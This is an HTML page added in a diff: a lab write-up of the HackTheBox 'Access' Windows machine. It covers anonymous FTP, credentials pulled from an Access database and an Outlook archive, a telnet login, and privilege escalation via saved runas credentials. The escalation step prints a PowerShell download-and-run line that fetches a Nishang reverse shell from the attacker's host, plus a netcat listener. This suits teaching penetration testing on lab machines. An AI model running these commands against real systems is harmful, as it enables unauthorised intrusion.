@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Access - PixRei Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0a0f0a;
+            --bg-secondary: #0d120d;
+            --bg-card: #111611;
+            --text-primary: #c8d6c8;
+            --text-secondary: #6b7c6b;
+            --text-muted: #3d4a3d;
+            --accent: #00ff88;
+            --accent-dim: #00cc6a;
+            --accent-glow: rgba(0, 255, 136, 0.15);
+            --border: #1a251a;
+            --htb-green: #9fef00;
+            --thm-red: #ff4444;
+            --easy: #4ade80;
+            --medium: #fbbf24;
+            --hard: #ef4444;
+            --code-bg: #0d1117;
+        }
+
+        [data-theme="light"] {
+            --bg-primary: #f0f4f0;
+            --bg-secondary: #e8ece8;
+            --bg-card: #ffffff;
+            --text-primary: #1a251a;
+            --text-secondary: #4a5a4a;
+            --text-muted: #8a9a8a;
+            --accent: #00994d;
+            --accent-dim: #007a3d;
+            --accent-glow: rgba(0, 153, 77, 0.1);
+            --border: #d0dcd0;
+            --code-bg: #f6f8fa;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+        }
+
+        .grid-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            background-image:
+                linear-gradient(var(--border) 1px, transparent 1px),
+                linear-gradient(90deg, var(--border) 1px, transparent 1px);
+            background-size: 60px 60px;
+            opacity: 0.3;
+        }
+
+        header {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            z-index: 1000;
+            background: rgba(10, 15, 10, 0.8);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        [data-theme="light"] header {
+            background: rgba(240, 244, 240, 0.9);
+        }
+
+        nav {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .logo::before { content: '> '; opacity: 0.5; }
+
+        .nav-right {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .back-btn {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+
+        .back-btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        .theme-toggle {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--accent);
+            width: 40px; height: 40px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        .theme-toggle:hover { border-color: var(--accent); }
+
+        .article-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 7rem 2rem 4rem;
+        }
+
+        .article-meta {
+            display: flex;
+            gap: 0.75rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            padding: 0.4rem 0.8rem;
+            border-radius: 4px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .badge.htb { background: rgba(159, 239, 0, 0.2); color: var(--htb-green); }
+        .badge.easy { background: rgba(74, 222, 128, 0.2); color: var(--easy); }
+        .badge.os { background: var(--accent-glow); color: var(--accent); }
+
+        .article-title {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: var(--text-primary);
+        }
+
+        .article-info {
+            display: flex;
+            gap: 2rem;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-bottom: 3rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+            flex-wrap: wrap;
+        }
+
+        /* TABLE OF CONTENTS */
+        .toc-box {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 3rem;
+        }
+
+        .toc-heading {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--accent);
+            margin-bottom: 1rem;
+            display: block;
+        }
+
+        .toc-links {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+
+        .toc-links li { margin-bottom: 0.6rem; }
+        .toc-links li:last-child { margin-bottom: 0; }
+
+        .toc-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.2s;
+        }
+
+        .toc-links a:hover { color: var(--accent); }
+        .toc-links a::before { content: '→ '; opacity: 0.5; }
+
+        /* CONTENT */
+        .content h2 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.4rem;
+            color: var(--accent);
+            margin: 3rem 0 1.5rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .content h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.1rem;
+            color: var(--text-primary);
+            margin: 2rem 0 1rem;
+        }
+
+        .content p {
+            color: var(--text-secondary);
+            margin-bottom: 1.5rem;
+        }
+
+        .content ul, .content ol {
+            color: var(--text-secondary);
+            margin-bottom: 1.5rem;
+            padding-left: 1.5rem;
+        }
+
+        .content li { margin-bottom: 0.5rem; }
+        .content strong { color: var(--text-primary); }
+        .content a { color: var(--accent); text-decoration: none; }
+        .content a:hover { text-decoration: underline; }
+
+        /* CODE BLOCKS */
+        .code-block {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            overflow: hidden;
+        }
+
+        .code-header {
+            background: var(--bg-card);
+            padding: 0.5rem 1rem;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .code-lang {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        .copy-btn {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .copy-btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        .code-block pre {
+            padding: 1rem;
+            margin: 0;
+            overflow-x: auto;
+        }
+
+        .code-block code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--text-primary);
+            line-height: 1.6;
+        }
+
+        .content code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            background: var(--bg-secondary);
+            padding: 0.15rem 0.4rem;
+            border-radius: 4px;
+            color: var(--accent);
+        }
+
+        .code-block code {
+            background: none;
+            padding: 0;
+        }
+
+        /* INFO BOXES */
+        .info-box {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-left: 4px solid var(--accent);
+            border-radius: 8px;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+        }
+
+        .info-box.warning { border-left-color: var(--medium); }
+        .info-box.danger { border-left-color: var(--hard); }
+        .info-box.success { border-left-color: var(--easy); }
+
+        .info-box-title {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+        }
+
+        .info-box.warning .info-box-title { color: var(--medium); }
+        .info-box.danger .info-box-title { color: var(--hard); }
+        .info-box.success .info-box-title { color: var(--easy); }
+        .info-box p { margin-bottom: 0; font-size: 0.9rem; }
+        .info-box ul { margin-bottom: 0; font-size: 0.9rem; }
+
+        /* TAKEAWAYS */
+        .takeaways {
+            background: var(--accent-glow);
+            border: 1px solid var(--accent);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 3rem 0;
+        }
+
+        .takeaways h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
+            color: var(--accent);
+            margin-bottom: 1rem;
+        }
+
+        .takeaways ul { margin-bottom: 0; }
+
+        /* NAVIGATION */
+        .article-nav {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            margin-top: 4rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border);
+        }
+
+        .nav-link {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            text-decoration: none;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            transition: all 0.2s;
+            flex: 1;
+            min-width: 150px;
+        }
+
+        .nav-link:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        .nav-link.prev::before { content: '← '; }
+        .nav-link.next { text-align: right; }
+        .nav-link.next::after { content: ' →'; }
+        .nav-link span {
+            display: block;
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            margin-bottom: 0.25rem;
+        }
+
+        footer {
+            padding: 3rem 0;
+            border-top: 1px solid var(--border);
+            text-align: center;
+            margin-top: 4rem;
+        }
+
+        .footer-text {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        @media (max-width: 768px) {
+            .article-title { font-size: 1.8rem; }
+            .article-container { padding: 6rem 1rem 2rem; }
+            .article-nav { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+    <div class="grid-bg"></div>
+
+    <header>
+        <nav>
+            <a href="../index.html" class="logo">PixRei</a>
+            <div class="nav-right">
+                <a href="../blog/index.html" class="back-btn">← All Writeups</a>
+                <button class="theme-toggle" id="themeToggle">◐</button>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        <article class="article-container">
+            <!-- BADGES -->
+            <div class="article-meta">
+                <span class="badge htb">HackTheBox</span>
+                <span class="badge easy">Easy</span>
+                <span class="badge os">🪟 Windows</span>
+            </div>
+
+            <!-- TITLE -->
+            <h1 class="article-title">Access</h1>
+
+            <!-- INFO -->
+            <div class="article-info">
+                <span>📅 July 31, 2025</span>
+                <span>⏱️ 20 min read</span>
+                <span>🏷️ FTP, Database, Telnet, PrivEsc, SavedCreds</span>
+            </div>
+
+            <!-- TABLE OF CONTENTS -->
+            <div class="toc-box">
+                <span class="toc-heading">// Table of Contents</span>
+                <ul class="toc-links">
+                    <li><a href="#summary">Summary</a></li>
+                    <li><a href="#reconnaissance">Reconnaissance</a></li>
+                    <li><a href="#ftp-enum">FTP Enumeration</a></li>
+                    <li><a href="#database">Database Analysis</a></li>
+                    <li><a href="#archive">Archive & Email Analysis</a></li>
+                    <li><a href="#foothold">Initial Foothold</a></li>
+                    <li><a href="#privesc">Privilege Escalation</a></li>
+                    <li><a href="#takeaways">Key Takeaways</a></li>
+                </ul>
+            </div>
+
+            <!-- CONTENT -->
+            <div class="content">
+                <h2 id="summary">Summary</h2>
+                <p>Access is an "easy" Windows machine that demonstrates how machines associated with physical security systems may not themselves be secure. We exploit anonymous FTP access to obtain a database file containing credentials, use those credentials to extract an email archive with more credentials, and finally exploit saved Windows credentials for privilege escalation.</p>
+
+                <div class="info-box">
+                    <div class="info-box-title">💡 Box Info</div>
+                    <p>
+                        <strong>IP:</strong> 10.10.10.98<br>
+                        <strong>OS:</strong> Windows Server 2008 R2<br>
+                        <strong>Difficulty:</strong> Easy<br>
+                        <strong>Key Skills:</strong> FTP Enumeration, MDB Analysis, Saved Credentials
+                    </p>
+                </div>
+
+                <h2 id="reconnaissance">Reconnaissance</h2>
+                <p>Starting with an Nmap scan to identify open ports and services:</p>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">bash</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>nmap -sC -sV -oA nmap/access 10.10.10.98</code></pre>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">nmap output</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+23/tcp open  telnet  Microsoft Windows XP telnetd
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-title: MegaCorp
+Service Info: OS: Windows</code></pre>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-box-title">📊 Port Analysis</div>
+                    <ul>
+                        <li><strong>Port 21 (FTP):</strong> Anonymous login allowed - Primary attack vector</li>
+                        <li><strong>Port 23 (Telnet):</strong> Potential access point once we get credentials</li>
+                        <li><strong>Port 80 (HTTP):</strong> IIS 7.5 serving MegaCorp website</li>
+                    </ul>
+                </div>
+
+                <h2 id="ftp-enum">FTP Enumeration</h2>
+                <p>Anonymous FTP access is our primary attack vector. Let's connect and explore:</p>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">bash</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>ftp 10.10.10.98
+Name: anonymous
+Password: [blank]
+230 User logged in.
+
+ftp> ls
+08-23-18  09:16PM       &lt;DIR&gt;          Backups
+08-24-18  10:00PM       &lt;DIR&gt;          Engineer</code></pre>
+                </div>
+
+                <h3>Downloading Files</h3>
+                <p>Let's grab everything from both directories:</p>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">bash</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>ftp> cd Backups
+ftp> get backup.mdb
+5652480 bytes received
+
+ftp> cd ../Engineer
+ftp> get "Access Control.zip"
+10870 bytes received</code></pre>
+                </div>
+
+                <div class="info-box success">
+                    <div class="info-box-title">✅ Files Retrieved</div>
+                    <ul>
+                        <li><strong>backup.mdb:</strong> 5.6MB Microsoft Access database</li>
+                        <li><strong>Access Control.zip:</strong> Password-protected archive</li>
+                    </ul>
+                </div>
+
+                <h2 id="database">Database Analysis</h2>
+                <p>The backup.mdb file is a Microsoft Access database. Let's analyze it using mdb-tools:</p>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">bash</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>sudo apt install mdb-tools
+mdb-tables backup.mdb | tr ' ' '\n' | grep -i user
+# Found: auth_user
+
+mdb-export backup.mdb auth_user</code></pre>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">output</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>id,username,password,Status,last_login,RoleID,Remark
+25,"admin","admin",1,"08/23/18 21:11:47",26,
+27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
+28,"backup_admin","admin",1,"08/23/18 21:14:02",26,</code></pre>
+                </div>
+
+                <div class="info-box warning">
+                    <div class="info-box-title">🔑 Credentials Found!</div>
+                    <ul>
+                        <li><strong>engineer:</strong> access4u@security</li>
+                        <li>This password might work for the ZIP file!</li>
+                    </ul>
+                </div>
+
+                <h2 id="archive">Archive & Email Analysis</h2>
+                <p>Let's try the engineer's password on the ZIP file:</p>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">bash</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>unzip "Access Control.zip"
+# Password: access4u@security
+# Extracted: Access Control.pst</code></pre>
+                </div>
+
+                <h3>PST File Analysis</h3>
+                <p>The extracted file is an Outlook PST archive. Let's convert and read it:</p>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">bash</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>sudo apt install pst-utils
+readpst "Access Control.pst"
+cat "Access Control.mbox"</code></pre>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">email content</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>From: john@megacorp.com
+To: security@accesscontrolsystems.com
+Subject: Credentials Update
+
+The password for the "security" account has been 
+changed to 4Cc3ssC0ntr0ller.
+Please ensure this is passed on to your engineers.</code></pre>
+                </div>
+
+                <div class="info-box success">
+                    <div class="info-box-title">🎯 Critical Credentials!</div>
+                    <ul>
+                        <li><strong>Username:</strong> security</li>
+                        <li><strong>Password:</strong> 4Cc3ssC0ntr0ller</li>
+                    </ul>
+                </div>
+
+                <h2 id="foothold">Initial Foothold</h2>
+                <p>Now we can use the discovered credentials to access the Telnet service:</p>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">bash</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>telnet 10.10.10.98
+login: security
+password: 4Cc3ssC0ntr0ller
+
+C:\Users\security></code></pre>
+                </div>
+
+                <h3>User Flag</h3>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">cmd</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>C:\Users\security\Desktop>type user.txt
+85d48b885cf14ed396b85608b3278068</code></pre>
+                </div>
+
+                <h2 id="privesc">Privilege Escalation</h2>
+                <p>Let's enumerate for privilege escalation vectors. Checking the Public desktop:</p>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">cmd</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>C:\Users\security>cd C:\Users\Public\Desktop
+C:\Users\Public\Desktop>dir
+08/22/2018  10:18 PM   1,870 ZKAccess3.5 Security System.lnk
+
+C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"</code></pre>
+                </div>
+
+                <div class="info-box danger">
+                    <div class="info-box-title">🚨 Critical Discovery - Saved Credentials!</div>
+                    <p>The shortcut contains:</p>
+                    <p><code>runas.exe /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"</code></p>
+                    <p>The <strong>/savecred</strong> parameter means Administrator credentials are saved and can be reused!</p>
+                </div>
+
+                <h3>Exploitation</h3>
+                <p>Set up a reverse shell using Nishang:</p>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">bash (attacker)</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code># Clone Nishang and prepare payload
+git clone https://github.com/samratashok/nishang.git
+cp nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
+echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443' >> shell.ps1
+
+# Start web server
+python3 -m http.server 80
+
+# Start listener
+nc -lvnp 443</code></pre>
+                </div>
+
+                <p>Execute the payload using saved credentials:</p>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">cmd (target)</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.10/shell.ps1')"</code></pre>
+                </div>
+
+                <h3>Administrator Shell</h3>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-lang">powershell</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>PS C:\Windows\system32> whoami
+access\administrator
+
+PS C:\Users\Administrator\Desktop> type root.txt
+6e1586cc7ab230a8d297e8f933d904cf</code></pre>
+                </div>
+
+                <div class="info-box success">
+                    <div class="info-box-title">🏆 Root Flag Captured!</div>
+                    <p><strong>Root Flag:</strong> 6e1586cc7ab230a8d297e8f933d904cf</p>
+                </div>
+
+                <div class="takeaways" id="takeaways">
+                    <h3>🎯 Key Takeaways</h3>
+                    <ul>
+                        <li><strong>Anonymous FTP:</strong> Always check for anonymous access on file sharing services</li>
+                        <li><strong>Database Files:</strong> MDB files often contain plaintext credentials - use mdb-tools</li>
+                        <li><strong>Email Archives:</strong> PST files frequently contain sensitive information</li>
+                        <li><strong>Credential Reuse:</strong> Always test found passwords across different services</li>
+                        <li><strong>Saved Credentials:</strong> The /savecred parameter in Windows is a significant security risk</li>
+                        <li><strong>Legacy Services:</strong> Telnet transmits in plaintext - easy targets</li>
+                    </ul>
+                </div>
+
+                <h2>Tools Used</h2>
+                <ul>
+                    <li><code>nmap</code> - Port scanning and service enumeration</li>
+                    <li><code>ftp</code> - Anonymous file transfer</li>
+                    <li><code>mdb-tools</code> - Microsoft Access database analysis</li>
+                    <li><code>readpst</code> - Outlook PST file conversion</li>
+                    <li><code>telnet</code> - Remote access</li>
+                    <li><code>nishang</code> - PowerShell reverse shell</li>
+                    <li><code>netcat</code> - Reverse shell listener</li>
+                </ul>
+            </div>
+
+            <!-- NAV -->
+            <nav class="article-nav">
+                <a href="#" class="nav-link prev">
+                    <span>Previous</span>
+                    Previous Box
+                </a>
+                <a href="#" class="nav-link next">
+                    <span>Next</span>
+                    Next Box
+                </a>
+            </nav>
+        </article>
+    </main>
+
+    <footer>
+        <p class="footer-text">© 2025 PixRei // Security Writeups</p>
+    </footer>
+
+    <script>
+        const themeToggle = document.getElementById('themeToggle');
+        const html = document.documentElement;
+
+        function setTheme(theme) {
+            html.setAttribute('data-theme', theme);
+            localStorage.setItem('theme', theme);
+            themeToggle.textContent = theme === 'dark' ? '◐' : '◑';
+        }
+
+        setTheme(localStorage.getItem('theme') || 'dark');
+
+        themeToggle.addEventListener('click', () => {
+            setTheme(html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
+        });
+
+        function copyCode(btn) {
+            const code = btn.closest('.code-block').querySelector('code').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                btn.textContent = 'Copied!';
+                setTimeout(() => btn.textContent = 'Copy', 2000);
+            });
+        }
+    </script>
+</body>
+</html>
